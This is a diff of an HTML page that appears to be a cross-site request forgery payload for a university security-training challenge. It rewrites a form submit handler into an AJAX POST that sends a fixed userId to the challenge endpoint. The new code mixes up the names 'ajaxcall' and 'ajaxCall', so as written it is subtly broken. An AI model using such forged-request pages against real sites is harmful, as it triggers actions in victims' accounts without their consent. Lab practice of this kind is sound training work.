@@ -7,23 +7,29 @@
 <input type="submit"/>
 </form>
 -->
-<form id="myForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus"  method="post">
+<form id="myForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="post">
+
     <input type="submit" value="submit">
 </form>
+
+<div id="resultsDiv">
+
+</div>
 <script>
 // document.csrfForm.submit();
-$(document).ready(function() {
-    $('#myForm')
-        .submit({
-            type: 'POST',
-            url : 'https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus',
-            data : {
-                userId: "09b532b01c801fd7c25b83fad47c7e8df894b588"
-            },
-            success : function (response) {
-                alert("The server says: " + response);
-            }
-        });
+$("#myForm").submit(function() {
+    var ajaxcall = $.ajax({
+        dataType: "text",
+        type: 'POST',
+        url : 'https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus',
+        data : {
+            userId: "09b532b01c801fd7c25b83fad47c7e8df894b588"
+        },
+        async: false
+    });
+    if (ajaxcall.status == 200)
+    {
+        alert(ajaxCall.responseText);
+    }
 });
-;
 </script>
